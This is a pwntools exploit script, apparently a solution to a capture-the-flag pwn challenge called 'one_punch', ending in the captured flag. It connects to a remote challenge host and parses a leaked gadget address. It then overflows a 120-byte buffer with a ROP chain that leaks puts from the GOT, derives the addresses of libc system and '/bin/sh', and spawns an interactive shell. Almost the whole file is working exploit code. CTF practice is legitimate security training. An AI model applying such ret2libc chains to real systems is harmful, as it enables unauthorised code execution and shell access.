from pwn import *
import time

# Load Environment
#context.terminal = ['tmux','splitw' ,'-h']
env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}

p = remote("netcat.deadsec.quest", 31794)
#p = process("./one_punch")
#p = gdb.debug("./one_punch", '''
#break *main
#break *vuln
#break *vuln+138''', env=env)



# Exploit
padA = b'A' * 120
padB = b'B' * 8

leak = p.recvuntil(b'cape! ')
pop_rdi_leak = p.recv(14).strip().decode('utf-8')
pop_rdi_addr = int(pop_rdi_leak, 16)
puts_plt_got = pop_rdi_addr + 11503
puts_plt = pop_rdi_addr + 405
init = pop_rdi_addr + 160

print('POP RDI leak: ', hex(pop_rdi_addr))


# 1. Save leaked pop_rdi address. 
# 2. Overflow & Return to init() for strcmp() == TRUE in vuln().
# 3. Leak libc() with 'pop rdi' leak and use puts() GOT entry.
# 4. Grab libc offsets: system(), '/bin/sh' address
# 4. Don't need to leak anything now, we can continue with our exploit.
# 5. overflow + pop rdi + system('/bin/sh)
p.clean()
pause()
p.sendline(padA + p64(init) + p64(pop_rdi_addr) + p64(puts_plt_got) + p64(puts_plt))

leak = p.recvline().rstrip()
libc_addr = unpack(leak, 'all')
system_addr = libc_addr - 196976
binsh = libc_addr + 1406920

print('libc puts() leak: ', hex(libc_addr))
print('libc system() leak: ', hex(system_addr))
pause()
p.sendline(padA + p64(pop_rdi_addr) + p64(binsh) + p64(system_addr))
p.interactive()


# dead{I_w4nn4_b3_4_s41ky0u_H3R00000000}
